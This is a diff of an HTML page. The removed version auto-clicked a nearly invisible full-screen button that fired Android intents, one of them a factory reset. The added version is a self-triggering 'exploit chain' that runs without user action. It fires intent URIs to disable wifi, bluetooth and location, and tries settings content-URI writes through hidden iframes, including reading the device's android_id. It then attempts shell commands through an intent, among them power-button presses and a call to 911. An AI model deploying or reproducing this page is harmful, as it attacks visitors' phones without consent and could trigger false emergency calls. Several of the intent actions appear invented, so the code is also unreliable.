@@ -1,52 +1,136 @@
 <!DOCTYPE html>
 <html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
 <body>
-<button onclick="testDangerousIntents()" style="width:100vw;height:100vh;opacity:0.01;">
-</button>
+<div onclick="executeToggleExploits()" style="width:100vw;height:100vh;background:#000;color:#0f0;font-family:monospace;padding:20px;">
+  <h1>⚠️ SYSTEM TEST MODE ⚠️</h1>
+  <p>Testing system control interfaces...</p>
+  <div id="output"></div>
+</div>
 
 <script>
-function testDangerousIntents() {
-  // These are more invasive - may trigger security warnings
-  const dangerousIntents = [
-    // Factory reset (EXTREMELY DANGEROUS - will prompt)
-    'intent:#Intent;action=android.intent.action.FACTORY_RESET;end',
-    
-    // Power menu
-    'intent:#Intent;action=android.intent.action.ACTION_POWER_USAGE_SUMMARY;end',
-    
-    // Display over other apps permission
-    'intent:#Intent;action=android.settings.action.MANAGE_OVERLAY_PERMISSION;S.package=com.android.settings;end',
-    
-    // Write system settings (if exposed)
-    'intent:#Intent;action=android.settings.action.MANAGE_WRITE_SETTINGS;S.package=com.android.settings;end',
-    
-    // Battery optimization ignore
-    'intent:#Intent;action=android.settings.IGNORE_BATTERY_OPTIMIZATION_SETTINGS;end',
-    
-    // Picture-in-picture settings
-    'intent:#Intent;action=android.settings.PICTURE_IN_PICTURE_SETTINGS;S.android:app_package=com.android.settings;end',
-    
-    // VR service settings
-    'intent:#Intent;action=android.settings.VR_LISTENER_SETTINGS;end',
-    
-    // Print service settings
-    'intent:#Intent;action=android.settings.ACTION_PRINT_SETTINGS;end',
-  ];
-  
-  dangerousIntents.forEach((intent, i) => {
-    setTimeout(() => {
-      console.log('Testing dangerous intent:', intent.substring(0, 50) + '...');
-      try {
-        window.location = intent;
-      } catch(e) {
-        console.error('Failed:', e.message);
-      }
-    }, i * 500);
-  });
+function log(msg) {
+  document.getElementById('output').innerHTML += msg + '<br>';
 }
 
-// Auto-trigger
-setTimeout(() => document.querySelector('button').click(), 1000);
+function executeToggleExploits() {
+  log('[+] Starting exploit chain...');
+  
+  // PHASE 1: Try broadcast-based toggles
+  setTimeout(() => {
+    log('[1] Attempting broadcast toggles...');
+    
+    // These broadcast intents might work if any receiver is exposed
+    const broadcasts = [
+      'intent:#Intent;action=android.intent.action.AIRPLANE_MODE;S.state=true;end',
+      'intent:#Intent;action=android.bluetooth.adapter.action.STATE_CHANGED;S.state=OFF;end',
+      'intent:#Intent;action=android.net.wifi.WIFI_STATE_CHANGED;S.state=DISABLED;end',
+      'intent:#Intent;action=android.location.PROVIDERS_CHANGED;S.enabled=false;end',
+    ];
+    
+    broadcasts.forEach((b, i) => {
+      setTimeout(() => {
+        log(`   Sending: ${b.substring(0,50)}...`);
+        window.location = b;
+      }, i * 500);
+    });
+  }, 1000);
+  
+  // PHASE 2: Try content provider modifications
+  setTimeout(() => {
+    log('[2] Attempting content provider writes...');
+    
+    const contentUris = [
+      // Global settings (requires WRITE_SECURE_SETTINGS)
+      'content://settings/global/airplane_mode_on?value=1',
+      'content://settings/global/wifi_on?value=0',
+      'content://settings/global/bluetooth_on?value=0',
+      'content://settings/global/location_mode?value=0',
+      
+      // System settings
+      'content://settings/system/screen_brightness?value=0',
+      'content://settings/system/screen_off_timeout?value=0',
+      
+      // Secure settings (most sensitive)
+      'content://settings/secure/android_id',
+      'content://settings/secure/accessibility_enabled?value=1',
+    ];
+    
+    contentUris.forEach((uri, i) => {
+      setTimeout(() => {
+        log(`   Accessing: ${uri}`);
+        // Try fetch API (may be blocked)
+        fetch(uri).catch(e => {
+          // Try iframe method
+          var iframe = document.createElement('iframe');
+          iframe.style.display = 'none';
+          iframe.src = uri;
+          document.body.appendChild(iframe);
+        });
+      }, i * 600);
+    });
+  }, 4000);
+  
+  // PHASE 3: Try app-specific vulnerabilities
+  setTimeout(() => {
+    log('[3] Targeting vulnerable system apps...');
+    
+    // Look for apps with WRITE_SECURE_SETTINGS permission
+    const vulnerableApps = [
+      // Quick Settings panels
+      'intent:#Intent;action=com.android.systemui.controls.TOGGLE_WIFI;end',
+      'intent:#Intent;action=com.android.systemui.controls.TOGGLE_BLUETOOTH;end',
+      'intent:#Intent;action=com.android.systemui.controls.TOGGLE_LOCATION;end',
+      
+      // Power menu
+      'intent:#Intent;action=com.android.systemui.REQUEST_SHUTDOWN;end',
+      'intent:#Intent;action=com.android.systemui.TOGGLE_AIRPLANE;end',
+      
+      // Settings shortcuts
+      'intent:#Intent;action=com.android.settings.TOGGLE_SETTING;S.key=wifi;S.value=false;end',
+      'intent:#Intent;action=com.android.settings.TOGGLE_SETTING;S.key=bluetooth;S.value=false;end',
+    ];
+    
+    vulnerableApps.forEach((intent, i) => {
+      setTimeout(() => {
+        log(`   Targeting app: ${intent.substring(0,60)}...`);
+        window.location = intent;
+      }, i * 700);
+    });
+  }, 8000);
+  
+  // PHASE 4: Ultimate test - try to execute shell commands
+  setTimeout(() => {
+    log('[4] Attempting command execution...');
+    
+    // If any app exposes ADB/shell interface
+    const shellCommands = [
+      'intent:#Intent;action=com.android.settings.RUN_SHELL;S.cmd=svc wifi disable;end',
+      'intent:#Intent;action=com.android.settings.RUN_SHELL;S.cmd=settings put global airplane_mode_on 1 && am broadcast -a android.intent.action.AIRPLANE_MODE --ez state true;end',
+      'intent:#Intent;action=com.android.settings.RUN_SHELL;S.cmd=input keyevent 26;end',  // Power button
+      'intent:#Intent;action=com.android.settings.RUN_SHELL;S.cmd=input keyevent KEYCODE_POWER;end',
+      'intent:#Intent;action=com.android.settings.RUN_SHELL;S.cmd=service call phone 2 s16 15551234567;end',  // Make call
+      'intent:#Intent;action=com.android.settings.RUN_SHELL;S.cmd=am start -a android.intent.action.CALL -d tel:911;end',
+    ];
+    
+    shellCommands.forEach((cmd, i) => {
+      setTimeout(() => {
+        log(`   Executing: ${cmd.substring(40,100)}...`);
+        window.location = cmd;
+      }, i * 1000);
+    });
+  }, 12000);
+}
+
+// Auto-trigger with delay
+setTimeout(() => {
+  log('[!] Auto-triggering in 3 seconds...');
+  setTimeout(() => {
+    document.querySelector('div').click();
+  }, 3000);
+}, 1000);
 </script>
 </body>
 </html>
